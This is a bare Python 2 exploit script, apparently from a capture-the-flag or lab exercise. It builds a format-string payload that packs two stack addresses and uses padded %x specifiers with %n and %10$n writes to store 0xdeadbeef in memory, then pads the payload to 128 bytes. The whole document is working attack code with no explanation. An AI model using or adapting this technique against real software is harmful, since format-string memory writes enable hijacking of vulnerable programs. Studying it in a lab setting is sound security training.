import struct



def pad(s):
        return s+"X"*(128-len(s))


check = struct.pack('I',0xbffffac8) # check address in the stack

over = struct.pack('I',0xbffffac8+2)

exploit = ""
exploit += check #push the address first write
exploit += over #second write
exploit += "BBBBCCCC"
exploit += "%9$48863x" #dead
exploit += "%9$n"
exploit += "%8126x"#beef
exploit += "%10$n"

#print "A"*128+over
print pad(exploit) 

